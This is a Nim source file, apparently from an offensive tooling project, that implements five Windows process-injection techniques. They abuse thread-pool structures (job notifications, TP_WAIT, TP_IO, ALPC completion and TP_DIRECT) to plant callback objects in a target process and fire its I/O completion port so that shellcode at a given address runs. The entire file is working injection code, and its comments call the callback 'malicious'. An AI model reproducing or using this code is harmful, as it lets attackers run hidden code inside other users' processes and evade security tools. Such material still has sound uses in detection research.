import std/[widestrs]
import winim/lean

import nimpool

proc injectViaJobCallback*(tProcess: HANDLE, pAddress: PVOID, hIoPort: HANDLE): bool =
  var
    hJob: HANDLE
    status: NTSTATUS
    remoteMemory: PVOID
    pFullTpJob: PFULL_TP_JOB
    completionPort: JOBOBJECT_ASSOCIATE_COMPLETION_PORT

  let pTpAllocJobNotification = cast[TpAllocJobNotification](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "TpAllocJobNotification"))
  if pTpAllocJobNotification == nil:
    echo "[!] Failed to get TpAllocJobNotification function pointer"
    return false

  hJob = CreateJobObjectA(NULL, "m4ul3r job")
  if hJob == 0:
    WIN32_ERR("CreateJobObjectA")
    return false

  status = pTpAllocJobNotification(pFullTpJob.addr, hJob, cast[PVOID](pAddress), NULL, NULL)
  if not NT_SUCCESS(status):
    NTAPI_ERR("TpAllocJobNotification", status)
    return false

  remoteMemory = VirtualAllocEx(tProcess, NULL, sizeof(FULL_TP_JOB), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if remoteMemory == nil:
    WIN32_ERR("VirtualAllocEx")
    return false

  if WriteProcessMemory(tProcess, remoteMemory, pFullTpJob, sizeof(FULL_TP_JOB), NULL) == 0:
    WIN32_ERR("WriteProcessMemory")
    return false

  # We have to zero out the associated completion port first
  if SetInformationJobObject(hJob, jobObjectAssociateCompletionPortInformation, completionPort.addr, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT).DWORD) == 0:
    WIN32_ERR("SetInformationJobObject [1]")
    return false

  # Associate completion port with payload
  completionPort.CompletionKey = remoteMemory
  completionPort.CompletionPort = hIoPort

  if SetInformationJobObject(hJob, jobObjectAssociateCompletionPortInformation, completionPort.addr, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT).DWORD) == 0:
    WIN32_ERR("SetInformationJobObject [2]")
    return false

  # Queue IO packet to job object completion port
  if AssignProcessToJobObject(hJob, GetCurrentProcess()) == 0:
    WIN32_ERR("AssignProcessToJobObject")
    return false

  return true


proc injectViaTpWait*(tProcess: HANDLE, pAddress: PVOID, hIoPort: HANDLE): bool =
  var
    pTpWait: PFULL_TP_WAIT
    remoteTpWait, remoteTpDirect: PVOID
    hEvent: HANDLE
    status: NTSTATUS

  let pNtAssociateWaitCompletionPacket = cast[NtAssociateWaitCompletionPacket](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtAssociateWaitCompletionPacket"))
  if pNtAssociateWaitCompletionPacket == nil:
    echo "[!] Failed to get NtAssociateWaitCompletionPacket function pointer"
    return false

  # Create a TP_WAIT object that will triggegr our callback once an asynchronous event is interacted with, such as SetEvent
  pTpWait = cast[PFULL_TP_WAIT](CreateThreadpoolWait(
    cast[PTP_WAIT_CALLBACK](pAddress), NULL, NULL
  ))
  if pTpWait == nil:
    WIN32_ERR("CreateThreadpoolWait")
    return false

  # Allocate and write memory into the process for the TP_WAIT callback object
  remoteTpWait = VirtualAllocEx(tProcess, NULL, sizeof(FULL_TP_WAIT), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if remoteTpWait == nil:
    WIN32_ERR("VirtualAllocEx [1]")
    return false

  if WriteProcessMemory(tProcess, remoteTpWait, pTpWait, sizeof(FULL_TP_WAIT), NULL) == 0:
    WIN32_ERR("WriteProcessMemory")
    return false

  # Do the same for a TP_DIRECT object, This is a helper object used to trigger the actual callback once an IO packet is sent.
  remoteTpDirect = VirtualAllocEx(tProcess, NULL, sizeof(TP_DIRECT), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if remoteTpDirect == nil:
    WIN32_ERR("VirtualAllocEx [2]")
    return false

  if WriteProcessMemory(tProcess, remoteTpDirect, (pTpWait.Direct).addr, sizeof(TP_DIRECT), NULL) == 0:
    WIN32_ERR("WriteProcessMemory")
    return false

  # Create event object
  let msg = newWideCString("m4ul3r event object".cstring)
  hEvent = CreateEventW(NULL, FALSE, FALSE, cast[LPCWSTR](msg[0].addr))
  if hEvent == 0:
    WIN32_ERR("CreateEventW")
    return false

  status = pNtAssociateWaitCompletionPacket(
    cast[HANDLE](pTpWait.WaitPkt), # This wait packet is associated with the shellcode
    hIoPort,                       # Where to send this packet once event is signaled
    hEvent,                        # The event in question
    remoteTpDirect,                # The helper object or key that gets looked at when a signal occurs
    remoteTpWait,                  # The actual callback
    0, 0, NULL
  )
  if not NT_SUCCESS(status):
    NTAPI_ERR("NtAssociateWaitCompletionPacket", status)
    return false

  SetEvent(hEvent)

  return true


proc injectViaTpIo*(tProcess: HANDLE, pAddress: PVOID, hIoPort: HANDLE): bool =
  var
    fullFilePath, tempPath: array[MAX_PATH, WCHAR]
    hFile: HANDLE
    pTpIo: PFULL_TP_IO
    pRemoteTpIo: PVOID
    ioStatusBlock: IO_STATUS_BLOCK
    fileCompletionInfo: FILE_COMPLETION_INFO
    status: NTSTATUS
    overlapped: OVERLAPPED

  let pNtSetInformationFile = cast[NtSetInformationFile](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtSetInformationFile"))
  if pNtSetInformationFile == nil:
    echo "[!] Failed to get NtSetInformation funciton pointer"
    return false

  # Get a random file we can use
  if GetTempPathW(MAX_PATH, cast[LPWSTR](tempPath[0].addr)) == 0:
    WIN32_ERR("GetTempPathW")
    return false

  let prefix = newWideCString("m4".cstring)
  if GetTempFileNameW(cast[LPCWSTR](tempPath[0].addr), cast[LPCWSTR](prefix[0].addr), 0, fullFilePath[0].addr) == 0:
    WIN32_ERR("GetTempFileNameW")
    return false

  hFile = CreateFileW(
    cast[LPCWSTR](fullFilePath[0].addr), GENERIC_READ or GENERIC_WRITE, 
    FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 
    FILE_ATTRIBUTE_NORMAL or FILE_FLAG_OVERLAPPED, 0                    # FILE_FLAG_OVERLAPPED is crucial for the signal to work
  )
  if hFile == INVALID_HANDLE_VALUE:
    WIN32_ERR("CreateFileW")
    return false

  # Create TP_IO object for callback
  pTpIo = cast[PFULL_TP_IO](CreateThreadpoolIo(
    hFile, cast[PTP_WIN32_IO_CALLBACK](pAddress), NULL, NULL
  ))
  if pTpIo == nil:
    WIN32_ERR("CreateThreadPoolIo")
    return false

  pTpIo.CleanupGroupMember.Union_1.Callback = pAddress
  pTpIo.PendingIrpCount += 1

  # Allocate TP_IO memory and write
  pRemoteTpIo = VirtualAllocEx(tProcess, NULL, sizeof(FULL_TP_IO), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if pRemoteTpIo == nil:
    WIN32_ERR("VirtualAllocEx")
    return false

  if WriteProcessMemory(tProcess, pRemoteTpIo, pTpIo, sizeof(FULL_TP_IO), NULL) == 0:
    WIN32_ERR("WriteProcessMemory")
    return false

  # Associate the file with the target process' IO completion port.
  # Any interaction with the file will now send a packet to the completion port, triggering the callback.
  fileCompletionInfo.Key = (cast[PFULL_TP_IO](pRemoteTpIo).Direct).addr
  fileCompletionInfo.Port = hIoPort

  status = pNtSetInformationFile(
    hFile, ioStatusBlock.addr, cast[PVOID](fileCompletionInfo.addr), 
    sizeof(FILE_COMPLETION_INFO).ULONG, cast[FILE_INFORMATION_CLASS](61)
    )
  if not NT_SUCCESS(status):
    NTAPI_ERR("NtSetInformationFile", status)
    return false

  # Trigger the callback via file interaction
  let msg = "m4ul3r".cstring
  if WriteFile(hFile, cast[LPCVOID](msg[0].addr), msg.len.DWORD, NULL, overlapped.addr) == 0 and GetLastError() != ERROR_IO_PENDING:
    WIN32_ERR("WriteFile")
    return false

  return true

proc injectViaAlpc*(tProcess: HANDLE, pAddress: PVOID, hIoPort: HANDLE): bool =
  var
    status: NTSTATUS
    hTempApcPort, hRealApcPort: HANDLE
    remoteTpAlpc: PVOID
    alpcMessageString: string = "m4ul3r"
    usAlpcPortName: UNICODE_STRING
    pFullTpAlpc: PFULL_TP_ALPC
    objectAttributes, clientAlpcAttributes: OBJECT_ATTRIBUTES
    alpcPortAttributes: ALPC_PORT_ATTRIBUTES

  let
    pNtAlpcCreatePort = cast[NtAlpcCreatePort](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtAlpcCreatePort"))
    pTpAllocAlpcCompletion = cast[TpAllocAlpcCompletion](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "TpAllocAlpcCompletion"))
    pNtAlpcSetInformation = cast[NtAlpcSetInformation](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtAlpcSetInformation"))
    pNtAlpcConnectPort = cast[NtAlpcConnectPort](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtAlpcConnectPort"))
  
  if pNtAlpcCreatePort == nil or pTpAllocAlpcCompletion == nil or pNtAlpcSetInformation == nil or pNtAlpcConnectPort == nil:
    echo "[!] Failed to get ALPC-related function pointers"
    return false

  # Create ALPC object
  status = pNtAlpcCreatePort(hTempApcPort.addr, NULL, NULL)
  if not NT_SUCCESS(status):
    NTAPI_ERR("NtAlpcCreatePort", status)
    return false

  # Create ALPC callback structure
  status = pTpAllocAlpcCompletion(pFullTpAlpc.addr, hTempApcPort, cast[PVOID](pAddress), NULL, NULL)
  if not NT_SUCCESS(status):
    NTAPI_ERR("TpAllocAlpcCompletion", status)
    return false

  # Create second port
  let portName = newWideCString("\\RPC Control\\m4ul3rsApcPort".cstring)
  RtlInitUnicodeString(usAlpcPortName.addr, cast[PCWSTR](portName[0].addr))

  objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES).ULONG
  objectAttributes.ObjectName = usAlpcPortName.addr

  alpcPortAttributes.Flags = 0x20000
  alpcPortAttributes.MaxMessageLength = 328

  status = pNtAlpcCreatePort(hRealApcPort.addr, objectAttributes.addr, alpcPortAttributes.addr)
  if not NT_SUCCESS(status):
    NTAPI_ERR("NtAplcCreatePort", status)
    return false

  # Copy ALPC callback struct into target process
  remoteTpAlpc = VirtualAllocEx(tProcess, NULL, sizeof(FULL_TP_ALPC), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if remoteTpAlpc == nil:
    WIN32_ERR("VirtualAllocEx")
    return false

  if WriteProcessMemory(tProcess, remoteTpAlpc, pFullTpAlpc, sizeof(FULL_TP_ALPC), NULL) == 0:
    WIN32_ERR("WriteProcessMemory")
    return false

  # Associate the process' IO completion port with our ALPC object
  var alpcAssocCompletionPort: ALPC_PORT_ASSOCIATE_COMPLETION_PORT
  alpcAssocCompletionPort.CompletionKey = remoteTpAlpc
  alpcAssocCompletionPort.CompletionPort = hIoPort

  status = pNtAlpcSetInformation(hRealApcPort, 2.ULONG, cast[PVOID](alpcAssocCompletionPort.addr), sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT).ULONG)
  if not NT_SUCCESS(status):
    NTAPI_ERR("NtAlpcSetInformation", status)

  # Send a message to the ALPC object
  clientAlpcAttributes.Length = sizeof(OBJECT_ATTRIBUTES).ULONG

  var clientAlpcMessage: ALPC_MESSAGE
  clientAlpcMessage.PortHeader.Union_1.S1.DataLength = alpcMessageString.len().USHORT
  clientAlpcMessage.PortHeader.Union_1.S1.TotalLength = (sizeof(PORT_MESSAGE) + alpcMessageString.len()).USHORT
  copyMem(clientAlpcMessage.PortMessage[0].addr, alpcMessageString[0].addr, alpcMessageString.len())
  let clientAlpcMessageSize = sizeof(clientAlpcMessage)

  # If a timeout for the ALPC connection is not specified, it will infinitely block
  var timeout: LARGE_INTEGER
  timeout.QuadPart = -10000000

  # Initiate the ALPC port connection and send IO packet
  var outHandle: HANDLE
  status = pNtAlpcConnectPort(
    outHandle.addr, usAlpcPortName.addr, clientAlpcAttributes.addr, alpcPortAttributes.addr, 
    0x20000.DWORD, NULL, cast[PPORT_MESSAGE](clientAlpcMessage.addr), cast[PSIZE_T](clientAlpcMessageSize.addr),
    NULL, NULL, timeout.addr
  )
  if status != ERROR_SUCCESS and status != STATUS_TIMEOUT:
    NTAPI_ERR("NtAlpcConnectPort", status)
    return false

  return true
  
proc injectViaTpDirect*(tProcess: HANDLE, pAddress: pointer, hIoPort: HANDLE): bool =
  var
    direct: TP_DIRECT
    remoteTpDirect: PVOID
    status: NTSTATUS
  
  direct.Callback = pAddress

  # Allocate remote memory for the TP_DIRECT object
  remoteTpDirect = VirtualAllocEx(tProcess, NULL, sizeof(TP_DIRECT), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if remoteTpDirect == nil:
    WIN32_ERR("VirtualAllocEx")
    return false

  if WriteProcessMemory(tProcess, remoteTpDirect, direct.addr, sizeof(TP_DIRECT), NULL) == 0:
    WIN32_ERR("WriteProcessMemory")
    return false

  let pNtSetIoCompletion = cast[NtSetIoCompletion](
    GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtSetIoCompletion")
  )
  if pNtSetIoCompletion == nil:
    echo "[!] Failed to get NtSetIoCompletion function pointer"
    return false

  # Trigger malicious callback
  status = pNtSetIoCompletion(hIoPort, remoteTpDirect, cast[PVOID](0), 0, 0)
  if not NT_SUCCESS(status):
    NTAPI_ERR("NtSetIoCompletion", status)
    return false
  
  return true